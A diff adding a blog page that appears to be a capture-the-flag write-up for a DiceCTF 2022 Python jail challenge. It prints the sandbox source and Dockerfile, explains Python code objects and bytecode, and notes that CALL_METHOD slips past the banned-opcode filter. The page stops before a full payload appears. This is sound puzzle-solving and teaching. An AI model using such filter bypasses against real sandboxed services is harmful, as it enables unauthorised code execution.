@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<title>TI-1337 Silver Edition</title>
+
+<meta name="author" content="betaveros" />
+<meta name="description" content="Last weekend Galhacktic Trendsetters sort of spontaneously decided to do DiceCTF 2022, months or years after most of us had done another CTF. It was a lot of fun and we placed 6th!
+ Back in the day the silver edition was the top of the line Texas Instruments calculator, but now the security is looking a little obsolete. Can you break it?
+ It’s yet another Python jail. We input a string and, after it makes it through a gauntlet of checks and processing, it gets exec’d.
+#!/usr/bin/env python3 import dis import sys  banned = [&amp;quot;MAKE_FUNCTION&amp;quot;, &amp;quot;CALL_FUNCTION&amp;quot;, &amp;quot;CALL_FUNCTION_KW&amp;quot;, &amp;quot;CALL_FUNCTION_EX&amp;quot;]  used_gift = False  def gift(target, name, value): global used_gift if used_gift: sys.exit(1) used_gift = True setattr(target, name, value)  print(&amp;quot;Welcome to the TI-1337 Silver Edition. Enter your calculations below:&amp;quot;)  math = input(&amp;quot;&amp;gt; &amp;quot;) if len(math) &amp;gt; 1337: print(&amp;quot;Nobody needs that much math!&amp;quot;) sys.exit(1) code = compile(math, &amp;quot;&amp;lt;math&amp;gt;&amp;quot;, &amp;quot;exec&amp;quot;)  bytecode = list(code.co_code) instructions = list(dis.get_instructions(code)) for i, inst in enumerate(instructions): if inst.is_jump_target: print(&amp;quot;Math doesn&amp;#39;t need control flow!&amp;quot;) sys.exit(1) nextoffset = instructions[i&#43;1].offset if i&#43;1 &amp;lt; len(instructions) else len(bytecode) if inst.opname in banned: bytecode[inst.offset:instructions[i&#43;1].offset] = [-1]*(instructions[i&#43;1].offset-inst.offset)  names = list(code.co_names) for i, name in enumerate(code.co_names): if &amp;quot;__&amp;quot; in name: names[i] = &amp;quot;$INVALID$&amp;quot;  code = code.replace(co_code=bytes(b for b in bytecode if b &amp;gt;= 0), co_names=tuple(names), co_stacksize=2**20) v = {} exec(code, {&amp;quot;__builtins__&amp;quot;: {&amp;quot;gift&amp;quot;: gift}}, v) if v: print(&amp;quot;\n&amp;quot;.join(f&amp;quot;{name}= {val}&amp;quot; for name, val in v.items())) else: print(&amp;quot;No results stored.&amp;quot;) More precisely, the gauntlet does the following:
+" /><meta name="generator" content="Hugo 0.88.0-DEV" />
+
+<link rel="canonical" href="//blog.vero.site/post/ti1337se" />
+<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="theme-color" content="#330000" />
+<meta name="twitter:creator" content="@betaveros">
+
+<link rel="icon" href="/favicon.ico" />
+
+<link rel="stylesheet" href="/css/bundle.css" />
+<link rel="stylesheet" href="/katex/katex.min.css" />
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+</head>
+<body><div id="wrapper">
+<header class="site-header"><h2 class="title"><a href="/">Bounded-Error Log</a></h2><p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
+<button class="menu-toggle" type="button" aria-label="Toggle Menu">
+	<span class="icon icon-menu" aria-hidden="true"></span>
+</button>
+<nav class="site-menu collapsed">
+	<h2 class="offscreen">Main Menu</h2>
+	<ul class="menu-list"><li class="menu-item "><a href="/about">About</a></li><li class="menu-item "><a href="/category/life">Life</a></li><li class="menu-item "><a href="/category/thoughts">Thoughts</a></li><li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li><li class="menu-item "><a href="/category/math">Math</a></li><li class="menu-item "><a href="/category/cs">CS</a></li><li class="menu-item "><a href="/category/puzzles">Puzzles</a></li><li class="menu-item "><a href="/category/meta">Meta</a></li><li class="menu-item "><a href="/ref">References</a></li><li class="menu-item "><a href="/util">Utilities</a></li><li class="menu-item "><a href="/all">All Posts</a></li></ul>
+</nav>
+<nav class="social-menu collapsed">
+	<h2 class="offscreen">Social Networks</h2>
+	<ul class="social-list"><li class="social-item">
+			<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
+
+		</li><li class="social-item">
+			<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
+		</li>
+	</ul>
+</nav>
+</header>
+
+<section class="main post-detail">
+	<header>
+		<h1 class="post-title">TI-1337 Silver Edition</h1>
+		
+		<h2 class="post-subtitle">DiceCTF 2022 (Misc, 299 pts)</h2>
+		
+		<p class="post-meta">
+		
+		2022-02-14
+		(3737 words)
+		
+		<span class="post-categories">
+			filed under
+			<a href="/category/cs">CS</a>
+		</span>
+		
+		</p>
+	</header>
+	<article><p>Last weekend <a href="https://galhacktictrendsetters.wordpress.com/">Galhacktic Trendsetters</a> sort of spontaneously decided to do <a href="https://ctf.dicega.ng/">DiceCTF 2022</a>, months or years after most of us had done another CTF. It was a lot of fun and we placed 6th!</p>
+<blockquote>
+<p>Back in the day the silver edition was the top of the line Texas Instruments calculator, but now the security is looking a little obsolete. Can you break it?</p>
+</blockquote>
+<p>It’s yet another Python jail. We input a string and, after it makes it through a gauntlet of checks and processing, it gets <code>exec</code>’d.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co">#!/usr/bin/env python3</span></a>
+<a class="sourceLine" id="cb1-2" title="2"><span class="im">import</span> dis</a>
+<a class="sourceLine" id="cb1-3" title="3"><span class="im">import</span> sys</a>
+<a class="sourceLine" id="cb1-4" title="4"></a>
+<a class="sourceLine" id="cb1-5" title="5">banned <span class="op">=</span> [<span class="st">&quot;MAKE_FUNCTION&quot;</span>, <span class="st">&quot;CALL_FUNCTION&quot;</span>, <span class="st">&quot;CALL_FUNCTION_KW&quot;</span>, <span class="st">&quot;CALL_FUNCTION_EX&quot;</span>]</a>
+<a class="sourceLine" id="cb1-6" title="6"></a>
+<a class="sourceLine" id="cb1-7" title="7">used_gift <span class="op">=</span> <span class="va">False</span></a>
+<a class="sourceLine" id="cb1-8" title="8"></a>
+<a class="sourceLine" id="cb1-9" title="9"><span class="kw">def</span> gift(target, name, value):</a>
+<a class="sourceLine" id="cb1-10" title="10">    <span class="kw">global</span> used_gift</a>
+<a class="sourceLine" id="cb1-11" title="11">    <span class="cf">if</span> used_gift: sys.exit(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb1-12" title="12">    used_gift <span class="op">=</span> <span class="va">True</span></a>
+<a class="sourceLine" id="cb1-13" title="13">    <span class="bu">setattr</span>(target, name, value)</a>
+<a class="sourceLine" id="cb1-14" title="14"></a>
+<a class="sourceLine" id="cb1-15" title="15"><span class="bu">print</span>(<span class="st">&quot;Welcome to the TI-1337 Silver Edition. Enter your calculations below:&quot;</span>)</a>
+<a class="sourceLine" id="cb1-16" title="16"></a>
+<a class="sourceLine" id="cb1-17" title="17">math <span class="op">=</span> <span class="bu">input</span>(<span class="st">&quot;&gt; &quot;</span>)</a>
+<a class="sourceLine" id="cb1-18" title="18"><span class="cf">if</span> <span class="bu">len</span>(math) <span class="op">&gt;</span> <span class="dv">1337</span>:</a>
+<a class="sourceLine" id="cb1-19" title="19">    <span class="bu">print</span>(<span class="st">&quot;Nobody needs that much math!&quot;</span>)</a>
+<a class="sourceLine" id="cb1-20" title="20">    sys.exit(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb1-21" title="21">code <span class="op">=</span> <span class="bu">compile</span>(math, <span class="st">&quot;&lt;math&gt;&quot;</span>, <span class="st">&quot;exec&quot;</span>)</a>
+<a class="sourceLine" id="cb1-22" title="22"></a>
+<a class="sourceLine" id="cb1-23" title="23">bytecode <span class="op">=</span> <span class="bu">list</span>(code.co_code)</a>
+<a class="sourceLine" id="cb1-24" title="24">instructions <span class="op">=</span> <span class="bu">list</span>(dis.get_instructions(code))</a>
+<a class="sourceLine" id="cb1-25" title="25"><span class="cf">for</span> i, inst <span class="kw">in</span> <span class="bu">enumerate</span>(instructions):</a>
+<a class="sourceLine" id="cb1-26" title="26">    <span class="cf">if</span> inst.is_jump_target:</a>
+<a class="sourceLine" id="cb1-27" title="27">        <span class="bu">print</span>(<span class="st">&quot;Math doesn&#39;t need control flow!&quot;</span>)</a>
+<a class="sourceLine" id="cb1-28" title="28">        sys.exit(<span class="dv">1</span>)</a>
+<a class="sourceLine" id="cb1-29" title="29">    nextoffset <span class="op">=</span> instructions[i<span class="op">+</span><span class="dv">1</span>].offset <span class="cf">if</span> i<span class="op">+</span><span class="dv">1</span> <span class="op">&lt;</span> <span class="bu">len</span>(instructions) <span class="cf">else</span> <span class="bu">len</span>(bytecode)</a>
+<a class="sourceLine" id="cb1-30" title="30">    <span class="cf">if</span> inst.opname <span class="kw">in</span> banned:</a>
+<a class="sourceLine" id="cb1-31" title="31">        bytecode[inst.offset:instructions[i<span class="op">+</span><span class="dv">1</span>].offset] <span class="op">=</span> [<span class="op">-</span><span class="dv">1</span>]<span class="op">*</span>(instructions[i<span class="op">+</span><span class="dv">1</span>].offset<span class="op">-</span>inst.offset)</a>
+<a class="sourceLine" id="cb1-32" title="32"></a>
+<a class="sourceLine" id="cb1-33" title="33">names <span class="op">=</span> <span class="bu">list</span>(code.co_names)</a>
+<a class="sourceLine" id="cb1-34" title="34"><span class="cf">for</span> i, name <span class="kw">in</span> <span class="bu">enumerate</span>(code.co_names):</a>
+<a class="sourceLine" id="cb1-35" title="35">    <span class="cf">if</span> <span class="st">&quot;__&quot;</span> <span class="kw">in</span> name: names[i] <span class="op">=</span> <span class="st">&quot;$INVALID$&quot;</span></a>
+<a class="sourceLine" id="cb1-36" title="36"></a>
+<a class="sourceLine" id="cb1-37" title="37">code <span class="op">=</span> code.replace(co_code<span class="op">=</span><span class="bu">bytes</span>(b <span class="cf">for</span> b <span class="kw">in</span> bytecode <span class="cf">if</span> b <span class="op">&gt;=</span> <span class="dv">0</span>), co_names<span class="op">=</span><span class="bu">tuple</span>(names), co_stacksize<span class="op">=</span><span class="dv">2</span><span class="op">**</span><span class="dv">20</span>)</a>
+<a class="sourceLine" id="cb1-38" title="38">v <span class="op">=</span> {}</a>
+<a class="sourceLine" id="cb1-39" title="39"><span class="bu">exec</span>(code, {<span class="st">&quot;__builtins__&quot;</span>: {<span class="st">&quot;gift&quot;</span>: gift}}, v)</a>
+<a class="sourceLine" id="cb1-40" title="40"><span class="cf">if</span> v: <span class="bu">print</span>(<span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>.join(<span class="ss">f&quot;</span><span class="sc">{</span>name<span class="sc">}</span><span class="ss"> = </span><span class="sc">{</span>val<span class="sc">}</span><span class="ss">&quot;</span> <span class="cf">for</span> name, val <span class="kw">in</span> v.items()))</a>
+<a class="sourceLine" id="cb1-41" title="41"><span class="cf">else</span>: <span class="bu">print</span>(<span class="st">&quot;No results stored.&quot;</span>)</a></code></pre></div>
+<p>More precisely, the gauntlet does the following:</p>
+<ol type="1">
+<li>Check if our input is longer than 1337 characters; if so, error out. This is not a harsh limit.</li>
+<li>Compile our code and disassemble it using the <a href="https://docs.python.org/3/library/dis.html"><code>dis</code> module</a>. If any instruction <code>is_jump_target</code>, which generally means any kind of control flow, error out. Delete any of the banned operations <code>MAKE_FUNCTION</code>, <code>CALL_FUNCTION</code>, <code>CALL_FUNCTION_KW</code>, and <code>CALL_FUNCTION_EX</code> from the assembled bytecode (this happens in two steps: first, by overwriting it with <code>-1</code>s, and second, by filtering those out near the end).</li>
+<li>Check our code for any names with double underscores, and replace any such names in the code object with <code>$INVALID$</code>, which basically guarantees your code won’t run.</li>
+<li>Execute the modified code object in an environment with a <code>gift</code> builtin and nothing else.</li>
+</ol>
+<p>(The challenge also comes with a Dockerfile, which says that the flag is in a file with a random filename. This didn’t end up being particularly relevant though.)</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode dockerfile"><code class="sourceCode dockerfile"><a class="sourceLine" id="cb2-1" title="1"><span class="kw">FROM</span> redpwn/jail:0.1.3</a>
+<a class="sourceLine" id="cb2-2" title="2"></a>
+<a class="sourceLine" id="cb2-3" title="3"><span class="kw">COPY</span> --from=python:3.9 / /srv</a>
+<a class="sourceLine" id="cb2-4" title="4"><span class="kw">COPY</span> flag.txt /srv/</a>
+<a class="sourceLine" id="cb2-5" title="5"><span class="kw">RUN</span> chmod 444 /srv/flag.txt &amp;&amp; mv /srv/flag.txt /srv/flag.`tr -dc A-Za-z0-9 &lt; /dev/urandom | head -c 20`.txt</a>
+<a class="sourceLine" id="cb2-6" title="6"><span class="kw">COPY</span> ti1337se.py /srv/app/run</a>
+<a class="sourceLine" id="cb2-7" title="7"><span class="kw">RUN</span> chmod 755 /srv/app/run</a></code></pre></div>
+<p>I knew very little about Python bytecode and code objects before this challenge. Bytecode is also an internal and unstable feature of the interpreter, so there’s not much documentation. Still, the <code>dis</code> module has enough documentation of bytecode instructions to get us by, and some of the special attributes of code objects and such, which also appear in the challenge, are lightly documented in the <a href="https://docs.python.org/3/library/inspect.html"><code>inspect</code> module</a>. Finally, it’s not too hard to figure out some of the details with a little experimentation and object introspection in a Python interpreter. Let’s do that.</p>
+<h3 id="diving-into-python-code-objects">Diving into Python code objects</h3>
+<p>This goes into a bit more depth than necessary, but I thought it was interesting, and I couldn’t find a tutorial on Python code objects I thought was a good fit for our use case in ten minutes of searching, so I decided to write it up.</p>
+<p>When you compile some Python source code via <code>compile</code>, you get a <em>code object</em>. As a trivial example, you could open an interpreter and run the following to get a code object <code>co</code>:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb3-1" title="1"><span class="op">&gt;&gt;&gt;</span> co <span class="op">=</span> <span class="bu">compile</span>(<span class="st">&#39;1 + 2&#39;</span>, <span class="st">&#39;&lt;math&gt;&#39;</span>, <span class="st">&#39;eval&#39;</span>)</a></code></pre></div>
+<p>The second parameter to <code>compile</code> is a filename and isn’t important. The third parameter is a mode, either <code>"eval"</code> or <code>"exec"</code>.</p>
+<p>We can evaluate <code>co</code>:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb4-1" title="1"><span class="op">&gt;&gt;&gt;</span> <span class="bu">eval</span>(co)</a>
+<a class="sourceLine" id="cb4-2" title="2"><span class="dv">3</span></a></code></pre></div>
+<p>(We could <code>exec</code> it too, but the return value doesn’t come out of <code>exec</code>, so we can’t see our code object in action. I’ll be using the <code>eval</code> mode below in a few examples, but most of the ideas are the same between the two modes.)</p>
+<p>We can get a somewhat human-readable representation of this code object’s instructions with <code>dis.get_instructions</code>:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb5-1" title="1"><span class="op">&gt;&gt;&gt;</span> <span class="im">import</span> dis</a>
+<a class="sourceLine" id="cb5-2" title="2"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb5-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">3</span>, argrepr<span class="op">=</span><span class="st">&#39;3&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb5-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>Note that you can call <code>dis.dis</code> for a prettier, less verbose printout (and also most of the <code>dis</code> functions are pretty smart and work with raw source code strings just as well as compiled code objects):</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb6-1" title="1"><span class="op">&gt;&gt;&gt;</span> dis.dis(<span class="st">&#39;1 + 2&#39;</span>)</a>
+<a class="sourceLine" id="cb6-2" title="2">  <span class="dv">1</span>           <span class="dv">0</span> LOAD_CONST               <span class="dv">0</span> (<span class="dv">3</span>)</a>
+<a class="sourceLine" id="cb6-3" title="3">              <span class="dv">2</span> RETURN_VALUE</a></code></pre></div>
+<p>However, I found the verbose printout more educational and exclusively used it while doing the challenge, so I’ll stick with it here too.</p>
+<p>Python’s bytecode is for a stack-based virtual machine of sorts. This example just has two instructions: the first pushes 3 into the stack, and the second returns the top value of the stack. Our code was so simple that the addition was optimized away, so this example wasn’t that illustrative. However, one thing to know already is that the bytecode instruction doesn’t itself directly contain the constant 3. Instead, the code object separately stores a tuple of all constants used by the code, and the bytecode just contains a reference to it. The list of constants used by a code object is in the attribute <code>co_consts</code>:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb7-1" title="1"><span class="op">&gt;&gt;&gt;</span> co.co_consts</a>
+<a class="sourceLine" id="cb7-2" title="2">(<span class="dv">3</span>,)</a></code></pre></div>
+<p>Though we cannot directly modify constants on a code object, we can use the method <code>replace</code> to get a new code object that’s identical except for the list of constants.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb8-1" title="1"><span class="op">&gt;&gt;&gt;</span> co2 <span class="op">=</span> co.replace(co_consts<span class="op">=</span>(<span class="dv">4</span>,))</a>
+<a class="sourceLine" id="cb8-2" title="2"><span class="op">&gt;&gt;&gt;</span> <span class="bu">eval</span>(co2)</a>
+<a class="sourceLine" id="cb8-3" title="3"><span class="dv">4</span></a></code></pre></div>
+<p>Disassembling this new code object shows what appear to be different instructions, which have the same opcodes but different <code>argval</code>s:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb9-1" title="1"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co2): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb9-2" title="2">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">4</span>, argrepr<span class="op">=</span><span class="st">&#39;4&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb9-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>However, the two code objects have exactly the same bytecode.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb10-1" title="1"><span class="op">&gt;&gt;&gt;</span> co.co_code, co2.co_code</a>
+<a class="sourceLine" id="cb10-2" title="2">(b<span class="st">&#39;d</span><span class="ch">\x00</span><span class="st">S</span><span class="ch">\x00</span><span class="st">&#39;</span>, b<span class="st">&#39;d</span><span class="ch">\x00</span><span class="st">S</span><span class="ch">\x00</span><span class="st">&#39;</span>)</a></code></pre></div>
+<p>The details of how bytecode is structured is fairly unimportant, but if you’re curious, as of Python 3.6, all bytecode instructions are two bytes: one byte for the opcode and one byte for the argument. Many opcodes ignore their argument, as in the example above with <code>RETURN_VALUE</code>. Opcodes can also take multi-byte arguments, up to four, by prefixing “instructions” with a special opcode, <code>EXTENDED_ARG</code>.</p>
+<p>So if we look at the numeric values of each byte in this code object’s bytecode, we can read off the opcodes and arguments:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb11-1" title="1"><span class="op">&gt;&gt;&gt;</span> [n <span class="cf">for</span> n <span class="kw">in</span> co.co_code]</a>
+<a class="sourceLine" id="cb11-2" title="2">[<span class="dv">100</span>, <span class="dv">0</span>, <span class="dv">83</span>, <span class="dv">0</span>]</a></code></pre></div>
+<p>The bytecode has two instructions: opcode 100 with argument 0, followed by opcode 83 with argument 0. This matches the <code>opcode</code> and <code>arg</code> fields of the <code>Instruction</code>s we got from iterating over <code>dis.get_instructions(co)</code>. The <code>argval</code>s differ because the <code>co_consts</code> associated with the code objects differ, not because the bytecodes differ.</p>
+<p>Let’s try the same thing for the code <code>x + y</code>:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb12-1" title="1">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb12-2" title="2">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;y&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;y&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb12-3" title="3">Instruction(opname<span class="op">=</span><span class="st">&#39;BINARY_ADD&#39;</span>, opcode<span class="op">=</span><span class="dv">23</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb12-4" title="4">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>This code object has no associated constants. However, <code>co.co_names</code> is a tuple of variable names that the code uses: <code>('x', 'y')</code>. The <code>LOAD_NAME</code> opcodes take arguments that reference variable names in <code>co_names</code>, just like the <code>LOAD_CONST</code> opcodes earlier take arguments that reference constants in <code>co_consts</code>.</p>
+<p>It’s worth noting that the same tuple is used for things like attribute accesses and method calls:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb13-1" title="1"><span class="op">&gt;&gt;&gt;</span> co <span class="op">=</span> <span class="bu">compile</span>(<span class="st">&#39;x.y.z()&#39;</span>, <span class="st">&#39;&lt;math&gt;&#39;</span>, <span class="st">&#39;eval&#39;</span>)</a>
+<a class="sourceLine" id="cb13-2" title="2"><span class="op">&gt;&gt;&gt;</span> co.co_names</a>
+<a class="sourceLine" id="cb13-3" title="3">(<span class="st">&#39;x&#39;</span>, <span class="st">&#39;y&#39;</span>, <span class="st">&#39;z&#39;</span>)</a>
+<a class="sourceLine" id="cb13-4" title="4"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb13-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_NAME&#39;</span>, opcode<span class="op">=</span><span class="dv">101</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="st">&#39;x&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;x&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb13-6" title="6">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_ATTR&#39;</span>, opcode<span class="op">=</span><span class="dv">106</span>, arg<span class="op">=</span><span class="dv">1</span>, argval<span class="op">=</span><span class="st">&#39;y&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;y&#39;</span>, offset<span class="op">=</span><span class="dv">2</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb13-7" title="7">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">160</span>, arg<span class="op">=</span><span class="dv">2</span>, argval<span class="op">=</span><span class="st">&#39;z&#39;</span>, argrepr<span class="op">=</span><span class="st">&#39;z&#39;</span>, offset<span class="op">=</span><span class="dv">4</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb13-8" title="8">Instruction(opname<span class="op">=</span><span class="st">&#39;CALL_METHOD&#39;</span>, opcode<span class="op">=</span><span class="dv">161</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=</span><span class="dv">0</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">6</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
+<a class="sourceLine" id="cb13-9" title="9">Instruction(opname<span class="op">=</span><span class="st">&#39;RETURN_VALUE&#39;</span>, opcode<span class="op">=</span><span class="dv">83</span>, arg<span class="op">=</span><span class="va">None</span>, argval<span class="op">=</span><span class="va">None</span>, argrepr<span class="op">=</span><span class="st">&#39;&#39;</span>, offset<span class="op">=</span><span class="dv">8</span>, starts_line<span class="op">=</span><span class="va">None</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a></code></pre></div>
+<p>This example is also remarkable in another way: the opcode we’re using to call <code>x.y.z</code> is <code>CALL_METHOD</code>, which is not any of the banned opcodes!</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb14-1" title="1">banned <span class="op">=</span> [<span class="st">&quot;MAKE_FUNCTION&quot;</span>, <span class="st">&quot;CALL_FUNCTION&quot;</span>, <span class="st">&quot;CALL_FUNCTION_KW&quot;</span>, <span class="st">&quot;CALL_FUNCTION_EX&quot;</span>]</a></code></pre></div>
+<p>A more natural way to discover this fact is probably by scrolling through the section of the <code>dis</code> module documentation on <a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions">Python bytecode instructions</a> and looking for names that contain the word “CALL”. This will be very important later.</p>
+<p>Let’s try something a bit more adventurous and compile a lambda expression, <code>lambda x, y: x + y</code>:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb15-1" title="1"><span class="op">&gt;&gt;&gt;</span> co <span class="op">=</span> <span class="bu">compile</span>(<span class="st">&#39;lambda x, y: x + y&#39;</span>, <span class="st">&#39;&lt;math&gt;&#39;</span>, <span class="st">&#39;eval&#39;</span>)</a>
+<a class="sourceLine" id="cb15-2" title="2"><span class="op">&gt;&gt;&gt;</span> co.co_names</a>
+<a class="sourceLine" id="cb15-3" title="3">()</a>
+<a class="sourceLine" id="cb15-4" title="4"><span class="op">&gt;&gt;&gt;</span> <span class="cf">for</span> inst <span class="kw">in</span> dis.get_instructions(co): <span class="bu">print</span>(inst)</a>
+<a class="sourceLine" id="cb15-5" title="5">Instruction(opname<span class="op">=</span><span class="st">&#39;LOAD_CONST&#39;</span>, opcode<span class="op">=</span><span class="dv">100</span>, arg<span class="op">=</span><span class="dv">0</span>, argval<span class="op">=&lt;</span>code <span class="bu">object</span> <span class="op">&lt;</span><span class="kw">lambda</span><span class="op">&gt;</span> at <span class="bn">0x7fd18bc0e920</span>, <span class="bu">file</span> <span class="st">&quot;&lt;math&gt;&quot;</span>, line <span class="dv">1</span><span class="op">&gt;</span>, argrepr<span class="op">=</span><span class="st">&#39;&lt;code object &lt;lambda&gt; at 0x7fd18bc0e920, file &quot;&lt;math&gt;&quot;, line 1&gt;&#39;</span>, offset<span class="op">=</span><span class="dv">0</span>, starts_line<span class="op">=</span><span class="dv">1</span>, is_jump_target<span class="op">=</span><span class="va">False</span>)</a>
